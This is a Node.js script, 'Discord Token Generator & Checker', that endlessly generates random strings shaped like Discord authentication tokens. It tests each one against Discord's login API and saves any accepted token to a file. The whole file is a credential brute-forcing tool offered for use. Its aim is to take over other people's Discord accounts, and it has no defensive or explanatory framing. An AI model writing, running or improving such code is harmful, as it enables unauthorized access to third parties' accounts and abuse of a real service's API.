"use strict";

// Dependencies
const randomString = require("randomstring")
const setTitle = require("console-title")
const request = require("request-async")
const delay = require("delay")
const chalk = require("chalk")
const fs = require("fs")

// Variables
const args = process.argv.slice(2)

// Main
if(!args.length) return console.log("usage: node index.js <output>")

setTitle(`Discord Token Generator & Checker | DT G&C | Dev: I2rys | Menu Dev: cutieQue | Assistant Dev: cutieQue`);
console.clear()
console.log(chalk.yellowBright(`
██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░  ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║  ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║  ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝  ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝
░██████╗░███████╗███╗░░██╗  ░█████╗░███╗░░██╗██████╗░  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗
██╔════╝░██╔════╝████╗░██║  ██╔══██╗████╗░██║██╔══██╗  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝
██║░░██╗░█████╗░░██╔██╗██║  ███████║██╔██╗██║██║░░██║  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░
██║░░╚██╗██╔══╝░░██║╚████║  ██╔══██║██║╚████║██║░░██║  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░
╚██████╔╝███████╗██║░╚███║  ██║░░██║██║░╚███║██████╔╝  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗
░╚═════╝░╚══════╝╚═╝░░╚══╝  ╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝
                                        - Dev : I2rys
                                        - Menu Dev : cutieQue
`))
    console.log(chalk.blueBright(`DT G&C Started!`))
    console.log("")

generatorChecker()
async function generatorChecker(){
   await delay(10)

    var mfaToken = randomString.generate({
        length: 84,
        charset: "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
    })
    
    mfaToken = `mfa.${mfaToken}`

    var notMFAToken = randomString.generate({
        length: 24,
        charset: "ODgyODkxNjE4NDczMDkxMDgy"
    })

    const notMFATokenHalf = randomString.generate({
        length: 6,
        charset: "YUW2-g"
    })

    const notMFATokenHalf2 = randomString.generate({
        length: 27,
        charset: "duZXhSN1RwE06PFEHRQkehmNdpw"
    })

    notMFAToken = `${notMFAToken}.${notMFATokenHalf}.${notMFATokenHalf2}`

    var response = await request("https://discord.com/api/v6/auth/login", {
        headers: {
            Authorization: mfaToken
        }
    })

    if(response.statusCode === 200){
        console.log(chalk.greenBright(`Valid token: ${mfaToken}`))

        const data = fs.readFileSync(args[0], "utf8")

        data.length ? fs.writeFileSync(args[0], `${data}\n${mfaToken}`, "utf8") : fs.writeFileSync(args[0], mfaToken, "utf8")
    }else{
        console.log(chalk.redBright(`Invalid token: ${mfaToken}`))
    }

    response = await request("https://discord.com/api/v6/auth/login", {
        headers: {
            authorization: notMFAToken
        }
    })

    if(response.statusCode === 200){
        console.log(chalk.greenBright(`Valid token: ${notMFAToken}`))

        const data = fs.readFileSync(args[0], "utf8")

        data.length ? fs.writeFileSync(args[0], `${data}\n${notMFAToken}`, "utf8") : fs.writeFileSync(args[0], notMFAToken, "utf8")
    }else{
        console.log(chalk.redBright(`Invalid token: ${notMFAToken}`))
    }

    generatorChecker()
}